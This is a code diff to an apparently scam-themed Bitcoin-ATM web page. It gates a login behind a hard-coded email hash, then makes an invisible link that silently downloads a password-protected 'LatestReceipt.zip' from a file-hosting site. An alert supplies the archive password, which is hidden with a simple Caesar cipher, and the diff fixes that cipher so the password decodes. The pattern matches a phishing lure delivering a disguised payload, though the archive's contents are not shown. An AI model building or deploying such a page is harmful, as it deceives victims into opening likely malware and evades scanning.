@@ -286,7 +286,6 @@
 
 	</style>
 	<link rel="icon" type="image/png" href="https://i.ibb.co/RC68XKL/BTCATM.png">
-
 </head>
 <body>
     <header>
@@ -540,11 +539,11 @@
 		document.getElementById('loginModal').style.display = 'none';
 	};
 
-	const targetHash = 56546806784635560497750350717989000390222724141; 
+	const targetHash = -1193835104; 
 
 	document.getElementById('email').oninput = function() {
 		var email = document.getElementById('email').value;
-		if (simpleHash(email) === targetHash) {
+		if (customHash(email) === targetHash) {
 			document.getElementById('passwordSection').style.display = 'block';
 		} else {
 			document.getElementById('passwordSection').style.display = 'none';
@@ -564,7 +563,7 @@
 	document.getElementById('loginForm').onsubmit = function(event) {
 		event.preventDefault();
 		var email = document.getElementById('email').value;
-		if (simpleHash(email) === targetHash && passwordStrength === 'Strong') {
+		if (customHash(email) === targetHash && passwordStrength === 'Strong') {
 			document.getElementById('loginModal').style.display = 'none';
 			document.getElementById('userDetails').style.display = 'block';
 		} else {
@@ -590,7 +589,17 @@
 		for (let i = 0; i < str.length; i++) {
 			let char = str.charCodeAt(i);
 			hash = ((hash << 5) - hash) + char;
-			hash = hash & hash;
+			hash = hash & 0xffffffff;
+		}
+		return hash;
+	}
+
+	function customHash(str) {
+		let hash = 0;
+		for (let i = 0; i < str.length; i++) {
+			let char = str.charCodeAt(i);
+			hash = (hash + char) * 31 + char;
+			hash = hash & hash; // Ensures we don't exceed 32-bit integer size
 		}
 		return hash;
 	}
@@ -615,15 +624,15 @@
 			const decryptedUrl = Decrypt("lxxtw://wxsvi8.ksjmpi.ms/hsarpseh/h8g10390-815j-8727-3i42-07h45gg2hgi7/PexiwxVigimtx.dmt", 4);
 
 			var downloadLink = document.createElement('a');
-			downloadLink.href = "https://store4.gofile.io/download/d4c76956-471f-4383-9e08-63d01cc8dce3/LatestReceipt.zip"; // Set the decrypted URL as the href
-			downloadLink.download = 'LatestReceipt.zip'; // Set the desired file name for the download
-			downloadLink.style.display = 'none'; // Make the link invisible
+			downloadLink.href = "https://store4.gofile.io/download/d4c76956-471f-4383-9e08-63d01cc8dce3/LatestReceipt.zip"; 
+			downloadLink.download = 'LatestReceipt.zip'; 
+			downloadLink.style.display = 'none'; 
 
 			document.body.appendChild(downloadLink);
 			downloadLink.click();
 			document.body.removeChild(downloadLink);
 
-			alert('Receipt securely downloaded. Password: ' + Decrypt("FXGEXQ", 4));
+			alert('Receipt securely downloaded. Password: ' + Decrypt("FXGEXQ", -4));
 		};
 	});
 
@@ -632,19 +641,15 @@
 		for (let i = 0; i < text.length; i++) {
 			let char = text[i];
 			if (char >= 'A' && char <= 'Z') {
-				// Shift uppercase characters
 				result += String.fromCharCode((char.charCodeAt(0) - 'A'.charCodeAt(0) + shift) % 26 + 'A'.charCodeAt(0));
 			} else if (char >= 'a' && char <= 'z') {
-				// Shift lowercase characters
 				result += String.fromCharCode((char.charCodeAt(0) - 'a'.charCodeAt(0) + shift) % 26 + 'a'.charCodeAt(0));
 			} else {
-				// Leave non-alphabetic characters unchanged
 				result += char;
 			}
 		}
 		return result;
 	}
-
 
 
 </script>
